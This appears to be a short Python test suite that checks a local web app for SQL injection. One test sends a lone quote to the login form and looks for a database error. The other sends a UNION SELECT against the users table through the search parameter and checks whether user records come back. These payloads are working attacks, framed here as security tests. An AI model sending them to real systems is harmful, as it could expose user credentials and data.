import requests


def test_sql_blind():
    """
    test a true condition for an SQL attack
    """
    resp = requests.post("https://localhost/login", data={"username": "'", "password": ""}, verify=False)

    if "ProgrammingError" in resp.text:
        assert True
    else:
        assert False

def test_sql_classic():
    """
    Tests classic sql injection attack on the search bar of / route
    """

    # Login as valid user -- True
    s = requests.session()
    resp = s.post("https://localhost/login", data={"username": "test_user", "password": "test_password"}, verify=False)

    # Check to see if login was successful by hitting main page
    resp = s.get("https://localhost/", verify=False)
    assert "Videos" in resp.text

    resp = s.get("https://localhost/?search_string=%27+UNION+SELECT+*+FROM+users%3B+--+", verify=False)
    assert "test_user" in resp.text